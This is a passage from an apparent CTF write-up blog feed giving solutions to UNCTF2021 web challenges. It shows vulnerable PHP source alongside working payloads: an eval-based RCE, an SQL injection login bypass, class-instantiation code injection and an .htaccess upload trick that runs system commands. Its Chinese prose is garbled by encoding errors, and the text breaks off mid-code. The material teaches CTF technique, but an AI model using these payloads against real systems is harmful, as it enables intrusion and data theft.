</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç¬¬ä¸€å±‚æ­£åˆ™è¡¨è¾¾å¼ä¸ºé€’å½’åŒ¹é…åªå«å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿çš„æ— å‚å‡½æ•°ï¼Œå¦‚ <code>a(b_c());</code>ï¼Œç¬¬äºŒå±‚è¦æ±‚ä¸èƒ½åŒ…å« <code>session|end|next|header|dir</code> å…³é”®å­—ï¼Œä½¿ç”¨ <code>get_defined_vars()</code> å¯ä»è¯·æ±‚ä¸­å‘ <code>$_GET</code> ä¼ å…¥æ‰€éœ€æ‰§è¡Œçš„å‡½æ•°ï¼Œç”±äº <code>end</code> å’Œ <code>next</code> ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä½¿ç”¨ <code>reset</code> å’Œ <code>array_reverse</code> è°ƒæ•´æ•°ç»„ä¸å–å€¼ï¼Œå†åˆ©ç”¨ <code>eval</code> å‘½ä»¤æ‰§è¡Œã€‚</p><p>payloadï¼š<code>?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æ–°å† ç–«æƒ…è‚†è™å…¨çƒï¼Œè¿™ä¸€åœºç–«æƒ…é˜»å‡»æˆ˜ä¸ä»…æ˜¯æˆ‘å›½å«ç”Ÿå¥åº·é¢†åŸŸçš„ä¸€åœºæˆ˜ç–«ï¼Œä¹Ÿæ˜¯ç§‘å­¦æŠ€æœ¯é¢†åŸŸçš„ä¸€æ¬¡å¤§è€ƒã€‚åœ¨è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œä¿éšœç½‘ç»œå®‰å…¨ï¼Œé˜²èŒƒåˆ©ç”¨æ–°å† è‚ºç‚ç–«æƒ…å®æ–½çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºæ˜¯å…³ç³»å¹¿å¤§äººæ°‘ç¾¤ä¼—åˆ‡èº«åˆ©ç›Šçš„å¤§äº‹ã€‚å¦‚ç½‘ç»œæ”»å‡»è€…å°†è®¡ç®—æœºç—…æ¯’ã€æœ¨é©¬å’Œç§»åŠ¨æ¶æ„ç¨‹åºç­‰ä¼ªè£…</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2021-å…¬å¼€èµ›</title>
    <link href="https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-12-07T11:44:54.000Z</published>
    <updated>2021-12-07T16:08:16.383Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ä¸ºå“åº”å›½å®¶é€‰æ‹”ã€æ¨èä¼˜ç§€ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ï¼ŒåŸ¹å…»å­¦ç”Ÿçš„åˆ›æ–°æ„è¯†ä¸å›¢é˜Ÿåˆä½œç²¾ç¥ï¼Œæé«˜å¤§å­¦ç”Ÿçš„ç½‘ç»œå®‰å…¨æŠ€æœ¯æ°´å¹³ã€åˆ›æ–°å®è·µä¸ç»¼åˆè®¾è®¡èƒ½åŠ›ï¼Œæ¨åŠ¨æˆ‘å›½é«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå»ºè®¾ä¸æ”¹é©ï¼Œå…¨å›½9æ‰€é«˜æ ¡ï¼ˆé—½å—å¸ˆèŒƒå¤§å­¦ï¼Œç¦å·å¤§å­¦è‡³è¯šå­¦é™¢ï¼Œé‡åº†å¤§å­¦ï¼Œé™†å†›å·¥ç¨‹å¤§å­¦ï¼Œå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ï¼Œé‡‘é™µç§‘æŠ€å­¦é™¢ï¼Œè¥¿åå¤§å­¦ï¼Œæµ™æ±Ÿå¸ˆèŒƒå¤§å­¦ï¼Œå¦é—¨ç†å·¥å¤§å­¦ï¼‰å†³å®šç»„æˆè”åˆæ‹›æ–°èµ›ï¼Œç§‰ç€å…¬å¹³ï¼Œå…¬æ­£ï¼Œå…¬å¼€çš„åŸåˆ™ä¸ºæœ¬é«˜æ ¡é€‰æ‹”ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ã€‚</p><p>ç«èµ›æ—¶é—´</p><p>2021å¹´11æœˆ28æ—¥-2021å¹´12æœˆ6æ—¥</p><p>ç«èµ›å¹³å°</p><p>è‡ªç ”å¹³å°ï¼Œå¹³å°åœ°å€ï¼š<a href="https://ctf.unctf.com/">https://ctf.unctf.com/</a></p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="fuzz-md5"><a href="#fuzz-md5" class="headerlink" title="fuzz_md5"></a>fuzz_md5</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$pass2</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass3</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$pass2</span>, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/unctf/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;unctf&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass3</span>===<span class="string">&quot;66666&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>user</code> å‚æ•°å€¼åŒå†™ç»•è¿‡ï¼Œ<code>pass</code> å‚æ•°å€¼çˆ†ç ´ç¬¦åˆå‰5ä½æ˜¯66666çš„MD5ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    x = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> x.startswith(<span class="string">&#x27;66666&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1004649</span></span><br></pre></td></tr></table></figure><p>Payloadï¼š<code>http://xxx/?user=ununctfctf</code>ï¼ŒPOSTä¼ å‚ <code>pass=1004649</code>ã€‚</p><p>flagï¼š<code>UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125;</code></p><p>â€‹    </p><h3 id="can-you-hacked-me"><a href="#can-you-hacked-me" class="headerlink" title="can_you_hacked_me"></a>can_you_hacked_me</h3><blockquote><p>å¸¦é»‘é˜”ï¼Œä½ èƒ½æŠŠæˆ‘éª‡å’¯ï¼Ÿ</p></blockquote><p><code>www.zip</code> å¾—åˆ°æºç ã€‚</p><p><code>index.php</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can You Hacked me?&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/&#x27;|union|select|&amp;|\||and|or|\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\&#x27;|union|select|&amp;|\\||and|or|(|,/i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $username = $_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = $_GET[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">    waf1($username) || waf1($password);</span><br><span class="line">    </span><br><span class="line">    if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        die(&#x27;Admin only allow to login at localhost&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    </span><br><span class="line">    echo $sql . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    </span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        // è¾“å‡ºæ•°æ®</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">                echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;You are not Admin.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Result Not Found!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>db.sql</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> supersqli;</span><br><span class="line"></span><br><span class="line">USE supersqli;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `users` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;AdminSecret&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç¦ç”¨çš„å…³é”®å­—ä½¿å¾—éš¾ä»¥è¿›è¡Œå¸¸è§„æ³¨å…¥ï¼Œè€ƒè™‘è®©whereæ¡ä»¶æ’çœŸï¼Œ<code>username</code> ä¼ å…¥ <code>\</code> è½¬ä¹‰åå•å¼•å·ï¼Œä½¿ <code>username</code> çš„å€¼ä¸º <code>&#39; and password =</code>ï¼Œ<code>password</code> ä¼ å…¥å¼‚æˆ–æ“ä½œï¼Œä½¿æ€»æ¡ä»¶æ’çœŸï¼Œå†ç­›é€‰å‡ºç¬¬äºŒæ¡æ•°æ®å³å¯è®©æŸ¥è¯¢ç»“æœä¸º <code>admin</code>ã€‚</p><p>Payloadï¼š</p><p><code>http://xxx/?username=\&amp;password=^0 limit 2 offset 1 --+</code></p><p>flagï¼š<code>UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125;</code></p><p>â€‹    </p><h3 id="phpmysql"><a href="#phpmysql" class="headerlink" title="phpmysql"></a>phpmysql</h3><blockquote><p>ä½ äº†è§£flagå—?åœ¨æ ¹ç›®å½•å“¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;æ¬¢è¿æ¥åˆ°unctf2021ï¼Œhave fun&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$db_user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$db_pwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$db_port</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db_host</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ•°æ®åº“åœ°å€ä¸èƒ½ä¸ºç©ºï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$db_host</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;fakeflag is /flag&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_user</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_pwd</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_port</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å˜‰ç„¶ä»Šå¤©åƒä»€ä¹ˆ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;mysql -h <span class="subst">$db_host</span> -u <span class="subst">$db_user</span> -p <span class="subst">$db_pwd</span> -P <span class="subst">$db_port</span> --enable-local-infile&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;Maybe you can do someting else&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$db_user</span>) || !<span class="keyword">isset</span>(<span class="variable">$db_pwd</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new Exception(\&quot;&lt;script&gt;alert(&#x27;å…³æ³¨å˜‰ç„¶ï¼Œé¡¿é¡¿è§£é¦‹ï¼ï¼ï¼&#x27;);&lt;/script&gt;\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$db_user</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;SplFileObject&quot;</span>, <span class="string">&quot;UNCTF2021&quot;</span>, <span class="variable">$db_user</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$db_user</span>(<span class="subst">$db_pwd</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></blockquote><p>åˆ©ç”¨æœ€å <code>eval(&quot;echo new $db_user($db_pwd);&quot;);</code> çš„æ‹¼æ¥ç‰¹æ€§ï¼Œç”¨ç±» <code>DirectoryIterator</code> åˆ—ç›®å½•åï¼Œå†RCEã€‚</p><p>Payloadï¼š</p><p>POSTä¼ å‚ <code>host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);//</code></p><p>â€‹    </p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/ph|\.\.|\//i&quot;</span>, <span class="variable">$filename</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/&lt;\?|ph/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>ä¼ å…¥æ–‡ä»¶åå’Œå†…å®¹å†™æ–‡ä»¶ï¼Œç¦ç”¨çš„å…³é”®å­—ç¦æ‰äº†ä¼ªåè®®ã€ç›®å½•ç©¿è¶Šã€å¸¸è§„PHPå¤´å’Œå†™PHPæ–‡ä»¶ã€‚</p><p>ç”±äºsandboxå†…æ— ç°æˆPHPæ–‡ä»¶ï¼Œè€ƒè™‘å†™ <code>.htaccess</code> æ–‡ä»¶å°†æ™®é€šæ–‡ä»¶ä»¥PHPæ–‡ä»¶è§£æã€‚</p><p>æ–‡ä»¶å†…æ— æ³•å†™å…¥PHPä»£ç ï¼Œå¯ä»¥å…ˆå†™å…¥base64ç¼–ç å­—ç¬¦ä¸²åï¼Œå†åˆ©ç”¨ <code>.htaccess</code> æ–‡ä»¶ä¼ªåè®®è§£æå³å¯ï¼Œ <code>.htaccess</code> æ–‡ä»¶ä¸­çš„ç”¨åˆ°çš„ <code>php</code> å…³é”®å­—ç”¨ <code>\</code> æ¢è¡Œç»•è¿‡ã€‚</p><p> <code>.htaccess</code> æ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br><span class="line">p\</span><br><span class="line">hp_value auto_append_file &quot;p\</span><br><span class="line">hp://filter/convert.base64-decode/resource=1.jpg&quot;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><p><code>http://xxx/?filename=.htaccess&amp;content=AddType%20application/x-httpd-p\%0ahp%20.jpg%0ap\%0ahp_value%20auto_append_file%20&quot;p\%0ahp://filter/convert.base64-decode/resource=1.jpg&quot;</code></p><p><code>http://xxx/?filename=1.jpg&amp;content=PD9waHAgc3lzdGVtKCJjYXQgL2ZsYWciKTs%2FPg%3D%3D</code></p><p>æœ€åè®¿é—® <code>1.jpg</code> å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="easy-serialize"><a href="#easy-serialize" class="headerlink" title="easy_serialize"></a>easy_serialize</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="variable">$action</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_POST</span>[<span 